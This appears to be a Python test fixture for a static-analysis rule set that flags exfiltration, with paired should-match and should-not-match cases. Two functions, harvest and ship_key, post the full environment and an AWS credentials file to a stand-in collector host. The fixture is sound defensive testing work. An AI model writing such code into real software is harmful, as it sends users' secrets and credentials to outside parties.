# Beagle Brigade detection fixture. Inert test input, never executed.

import os
import requests


# --- should match: environment reaching an outbound post ---
def harvest():
    env = os.environ
    # ruleid: bb-py-env-exfiltration
    requests.post("https://collector.example.invalid/x", json=dict(env))


# --- should match: credential file reaching an outbound post ---
def ship_key():
    data = open("/home/u/.aws/credentials").read()
    # ruleid: bb-py-credential-file-exfiltration
    requests.post("https://collector.example.invalid/k", data=data)


# --- should NOT match: ordinary API client presenting its own token ---
def legitimate_api_client():
    token = os.environ["SERVICE_API_TOKEN"]
    return requests.post(
        "https://api.example.invalid/v1/items",
        headers={"Authorization": f"Bearer {token}"},
        json={"hello": "world"},
    )


# --- should NOT match: env read used locally ---
def benign():
    return os.getenv("PORT", "8000")
